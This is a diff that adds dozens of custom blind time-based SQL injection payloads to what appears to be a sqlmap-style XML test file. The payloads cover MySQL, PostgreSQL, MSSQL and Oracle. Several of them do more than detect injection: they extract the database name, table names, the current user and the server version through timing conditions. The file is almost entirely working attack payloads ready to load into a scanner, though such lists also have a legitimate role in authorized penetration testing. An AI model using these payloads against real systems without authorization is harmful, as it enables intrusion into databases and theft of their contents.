@@ -1,9 +1,881 @@
 <?xml version="1.0" encoding="UTF-8"?>
-
 <root>
     <!-- Time-based boolean tests -->
-
     <!-- Prefering "query SLEEP" over "SLEEP" because of JOIN-alike cases where SLEEPs get called multiple times (e.g. http://testphp.vulnweb.com/listproducts.php?cat=1) -->
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' + (select*from(select(sleep([SLEEPTIME])))a) +'</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' + (select*from(select(sleep([SLEEPTIME])))a) +' </vector>
+        <request>
+            <payload>[RANDNUM]' + (select*from(select(sleep([SLEEPTIME])))a) +' </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' or sleep([SLEEPTIME])#-- </title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' or sleep([SLEEPTIME])#--  </vector>
+        <request>
+            <payload>[RANDNUM]' or sleep([SLEEPTIME])#--  </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' or sleep([SLEEPTIME])='</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' or sleep([SLEEPTIME])=' </vector>
+        <request>
+            <payload>[RANDNUM]' or sleep([SLEEPTIME])=' </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ;waitfor delay '0:0:[SLEEPTIME]'-- </title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM];waitfor delay '0:0:[SLEEPTIME]'-- </vector>
+        <request>
+            <payload>[RANDNUM];waitfor delay '0:0:[SLEEPTIME]'-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ') or sleep([SLEEPTIME])='</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]') or sleep([SLEEPTIME])=' </vector>
+        <request>
+            <payload>[RANDNUM]') or sleep([SLEEPTIME])=' </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' AND SLEEP([SLEEPTIME])/*</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' AND SLEEP([SLEEPTIME])/* </vector>
+        <request>
+            <payload>[RANDNUM]' AND SLEEP([SLEEPTIME])/* </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' AND '1'='1' AND SLEEP([SLEEPTIME])</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' AND '1'='1' AND SLEEP([SLEEPTIME]) </vector>
+        <request>
+            <payload>[RANDNUM]' AND '1'='1' AND SLEEP([SLEEPTIME]) </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' ; WAITFOR DELAY '00:00:[SLEEPTIME]' -- </title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' ; WAITFOR DELAY '00:00:[SLEEPTIME]' -- </vector>
+        <request>
+            <payload>[RANDNUM]' ; WAITFOR DELAY '00:00:[SLEEPTIME]' -- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: SLEEP([SLEEPTIME]) /*' or SLEEP([SLEEPTIME]) or '" or SLEEP([SLEEPTIME]) or "*/</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]SLEEP([SLEEPTIME]) /*' or SLEEP([SLEEPTIME]) or '" or SLEEP([SLEEPTIME]) or "*/ </vector>
+        <request>
+            <payload>[RANDNUM]SLEEP([SLEEPTIME]) /*' or SLEEP([SLEEPTIME]) or '" or SLEEP([SLEEPTIME]) or "*/ </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: 0'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]0'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z </vector>
+        <request>
+            <payload>[RANDNUM]0'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: 63770'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]63770'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z </vector>
+        <request>
+            <payload>[RANDNUM]63770'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR'Z </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep([SLEEPTIME]) END--</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep([SLEEPTIME]) END-- </vector>
+        <request>
+            <payload>[RANDNUM]SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep([SLEEPTIME]) END-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: '; SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep([SLEEPTIME]) END--</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]'; SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep([SLEEPTIME]) END-- </vector>
+        <request>
+            <payload>[RANDNUM]'; SELECT CASE WHEN (1=1) THEN pg_sleep([SLEEPTIME]) ELSE pg_sleep([SLEEPTIME]) END-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' AND IF(1=1, SLEEP([SLEEPTIME]), 0)--'</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' AND IF(1=1, SLEEP([SLEEPTIME]), 0)--' </vector>
+        <request>
+            <payload>[RANDNUM]' AND IF(1=1, SLEEP([SLEEPTIME]), 0)--' </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END;--'</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END;--' </vector>
+        <request>
+            <payload>[RANDNUM]' BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END;--' </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' AND IF((SELECT LENGTH(database()))&gt;1, SLEEP([SLEEPTIME]), 0) --</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' AND IF((SELECT LENGTH(database()))&gt;1, SLEEP([SLEEPTIME]), 0) -- </vector>
+        <request>
+            <payload>[RANDNUM]' AND IF((SELECT LENGTH(database()))&gt;1, SLEEP([SLEEPTIME]), 0) -- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))='a', SLEEP([SLEEPTIME]), 0) --</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))='a', SLEEP([SLEEPTIME]), 0) -- </vector>
+        <request>
+            <payload>[RANDNUM]' AND IF((SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1))='a', SLEEP([SLEEPTIME]), 0) -- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) &amp; 1, SLEEP([SLEEPTIME]), 0) --</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) &amp; 1, SLEEP([SLEEPTIME]), 0) -- </vector>
+        <request>
+            <payload>[RANDNUM]' AND IF((SELECT ASCII(SUBSTRING((SELECT database()),1,1))) &amp; 1, SLEEP([SLEEPTIME]), 0) -- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ' UNION SELECT IF((SELECT LENGTH(database()))&lt;1, SLEEP([SLEEPTIME]), 0), 1, user(), 4 --</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]' UNION SELECT IF((SELECT LENGTH(database()))&lt;1, SLEEP([SLEEPTIME]), 0), 1, user(), 4 -- </vector>
+        <request>
+            <payload>[RANDNUM]' UNION SELECT IF((SELECT LENGTH(database()))&lt;1, SLEEP([SLEEPTIME]), 0), 1, user(), 4 -- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: 'XOR(if(now()=sysdate(),sleep(2*6),0))OR'</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]'XOR(if(now()=sysdate(),sleep(2*6),0))OR' </vector>
+        <request>
+            <payload>[RANDNUM]'XOR(if(now()=sysdate(),sleep(2*6),0))OR' </payload>
+        </request>
+        <response>
+            <time>12</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: 1'=sleep([SLEEPTIME])='1</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]1'=sleep([SLEEPTIME])='1 </vector>
+        <request>
+            <payload>[RANDNUM]1'=sleep([SLEEPTIME])='1 </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: '%2b(select*from(select(sleep([SLEEPTIME])))a)%2b'</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]'%2b(select*from(select(sleep([SLEEPTIME])))a)%2b' </vector>
+        <request>
+            <payload>[RANDNUM]'%2b(select*from(select(sleep([SLEEPTIME])))a)%2b' </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: WAITFOR DELAY '0:0:[SLEEPTIME]';--</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]WAITFOR DELAY '0:0:[SLEEPTIME]';-- </vector>
+        <request>
+            <payload>[RANDNUM]WAITFOR DELAY '0:0:[SLEEPTIME]';-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: OR SLEEP([SLEEPTIME])</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]OR SLEEP([SLEEPTIME]) </vector>
+        <request>
+            <payload>[RANDNUM]OR SLEEP([SLEEPTIME]) </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: AND SLEEP([SLEEPTIME]) AND ('kleiton'='kleiton</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]AND SLEEP([SLEEPTIME]) AND ('kleiton'='kleiton </vector>
+        <request>
+            <payload>[RANDNUM]AND SLEEP([SLEEPTIME]) AND ('kleiton'='kleiton </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: WAITFOR DELAY '0:0:[SLEEPTIME]' and 'a'='a;--</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]WAITFOR DELAY '0:0:[SLEEPTIME]' and 'a'='a;-- </vector>
+        <request>
+            <payload>[RANDNUM]WAITFOR DELAY '0:0:[SLEEPTIME]' and 'a'='a;-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: IF 1=1 THEN dbms_lock.sleep([SLEEPTIME]);</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]IF 1=1 THEN dbms_lock.sleep([SLEEPTIME]); </vector>
+        <request>
+            <payload>[RANDNUM]IF 1=1 THEN dbms_lock.sleep([SLEEPTIME]); </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: SLEEP([SLEEPTIME])</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]SLEEP([SLEEPTIME]) </vector>
+        <request>
+            <payload>[RANDNUM]SLEEP([SLEEPTIME]) </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: pg_sleep([SLEEPTIME])</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]pg_sleep([SLEEPTIME]) </vector>
+        <request>
+            <payload>[RANDNUM]pg_sleep([SLEEPTIME]) </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: and if(substring(user(),1,1)&gt;=chr(97),SLEEP([SLEEPTIME]),1)--</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]and if(substring(user(),1,1)&gt;=chr(97),SLEEP([SLEEPTIME]),1)-- </vector>
+        <request>
+            <payload>[RANDNUM]and if(substring(user(),1,1)&gt;=chr(97),SLEEP([SLEEPTIME]),1)-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: DBMS_LOCK.SLEEP([SLEEPTIME]);</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]DBMS_LOCK.SLEEP([SLEEPTIME]); </vector>
+        <request>
+            <payload>[RANDNUM]DBMS_LOCK.SLEEP([SLEEPTIME]); </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: AND if not(substring((select @version),25,1) &lt; 52) waitfor delay '0:0:[SLEEPTIME]'--
+        </title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]AND if not(substring((select @version),25,1) &lt; 52) waitfor delay '0:0:[SLEEPTIME]'-- 
+        </vector>
+        <request>
+            <payload>[RANDNUM]AND if not(substring((select @version),25,1) &lt; 52) waitfor delay '0:0:[SLEEPTIME]'-- 
+            </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: '); waitfor delay '0:0:[SLEEPTIME];--</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]'); waitfor delay '0:0:[SLEEPTIME];-- </vector>
+        <request>
+            <payload>[RANDNUM]'); waitfor delay '0:0:[SLEEPTIME];-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ') waitfor delay '0:0:[SLEEPTIME];--</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]') waitfor delay '0:0:[SLEEPTIME];-- </vector>
+        <request>
+            <payload>[RANDNUM]') waitfor delay '0:0:[SLEEPTIME];-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: (SELECT 1 FROM (SELECT SLEEP([SLEEPTIME]))A)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM](SELECT 1 FROM (SELECT SLEEP([SLEEPTIME]))A) </vector>
+        <request>
+            <payload>[RANDNUM](SELECT 1 FROM (SELECT SLEEP([SLEEPTIME]))A) </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: %2b(select*from(select(sleep([SLEEPTIME])))a)%2b'</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]%2b(select*from(select(sleep([SLEEPTIME])))a)%2b' </vector>
+        <request>
+            <payload>[RANDNUM]%2b(select*from(select(sleep([SLEEPTIME])))a)%2b' </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: /**/xor/**/sleep([SLEEPTIME])</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]/**/xor/**/sleep([SLEEPTIME]) </vector>
+        <request>
+            <payload>[RANDNUM]/**/xor/**/sleep([SLEEPTIME]) </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: or (sleep([SLEEPTIME])+1) limit 1 --</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]or (sleep([SLEEPTIME])+1) limit 1 -- </vector>
+        <request>
+            <payload>[RANDNUM]or (sleep([SLEEPTIME])+1) limit 1 -- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR </vector>
+        <request>
+            <payload>[RANDNUM]XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))XOR </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: if(now()=sysdate(),SLEEP([SLEEPTIME]),0)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]if(now()=sysdate(),SLEEP([SLEEPTIME]),0) </vector>
+        <request>
+            <payload>[RANDNUM]if(now()=sysdate(),SLEEP([SLEEPTIME]),0) </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: '%3bWAITFOR+DELAY+'00%3a00%3a12'--</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]'%3bWAITFOR+DELAY+'00%3a00%3a[SLEEPTIME]'-- </vector>
+        <request>
+            <payload>[RANDNUM]'%3bWAITFOR+DELAY+'00%3a00%3a[SLEEPTIME]'-- </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: 'XOR(if(now()=sysdate(),(sleep(((([SLEEPTIME]))))),0))XOR'X</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]'XOR(if(now()=sysdate(),(sleep(((([SLEEPTIME]))))),0))XOR'X </vector>
+        <request>
+            <payload>[RANDNUM]'XOR(if(now()=sysdate(),(sleep(((([SLEEPTIME]))))),0))XOR'X </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ;SELECT IF((8303&gt;8302),SLEEP([SLEEPTIME]),2356)#</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM];SELECT IF((8303&gt;8302),SLEEP([SLEEPTIME]),2356)# </vector>
+        <request>
+            <payload>[RANDNUM];SELECT IF((8303&gt;8302),SLEEP([SLEEPTIME]),2356)# </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: IF(NOW()=SYSDATE(), SLEEP([SLEEPTIME]), 0)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]IF(NOW()=SYSDATE(), SLEEP([SLEEPTIME]), 0) </vector>
+        <request>
+            <payload>[RANDNUM]IF(NOW()=SYSDATE(), SLEEP([SLEEPTIME]), 0) </payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ; SELECT CASE WHEN (NOW()=CURRENT_TIMESTAMP) THEN pg_sleep([SLEEPTIME]) ELSE 0 END; </title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]; SELECT CASE WHEN (NOW()=CURRENT_TIMESTAMP) THEN pg_sleep([SLEEPTIME]) ELSE 0 END;</vector>
+        <request>
+            <payload>[RANDNUM]; SELECT CASE WHEN (NOW()=CURRENT_TIMESTAMP) THEN pg_sleep([SLEEPTIME]) ELSE 0 END;</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ; IF (GETDATE() = SYSDATETIME()) WAITFOR DELAY '00:00:[SLEEPTIME]'; </title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]; IF (GETDATE() = SYSDATETIME()) WAITFOR DELAY '00:00:[SLEEPTIME]';</vector>
+        <request>
+            <payload>[RANDNUM]; IF (GETDATE() = SYSDATETIME()) WAITFOR DELAY '00:00:[SLEEPTIME]';</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: ; DECLARE v_dummy NUMBER; BEGIN IF (SYSDATE = CURRENT_DATE) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); END IF; END; </title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]; DECLARE v_dummy NUMBER; BEGIN IF (SYSDATE = CURRENT_DATE) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); END IF; END;</vector>
+        <request>
+            <payload>[RANDNUM]; DECLARE v_dummy NUMBER; BEGIN IF (SYSDATE = CURRENT_DATE) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); END IF; END;</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: X'XOR(if(now()=sysdate(),/**/sleep([SLEEPTIME])/**/,0))XOR'X</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]X'XOR(if(now()=sysdate(),/**/sleep([SLEEPTIME])/**/,0))XOR'X</vector>
+        <request>
+            <payload>[RANDNUM]X'XOR(if(now()=sysdate(),/**/sleep([SLEEPTIME])/**/,0))XOR'X</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: if(now()=sysdate(),sleep([SLEEPTIME]),0)/*'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR'"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR"*/</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM]if(now()=sysdate(),sleep([SLEEPTIME]),0)/*'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR'"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR"*/</vector>
+        <request>
+            <payload>[RANDNUM]if(now()=sysdate(),sleep([SLEEPTIME]),0)/*'XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR'"XOR(if(now()=sysdate(),sleep([SLEEPTIME]),0))OR"*/</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
+        <title>CUSTOM Blind-SQL time-based payload: (select(0)from(select(sleep([SLEEPTIME])))v)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>[RANDNUM](select(0)from(select(sleep([SLEEPTIME])))v)</vector>
+        <request>
+            <payload>[RANDNUM](select(0)from(select(sleep([SLEEPTIME])))v)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+    </test>
+    <test>
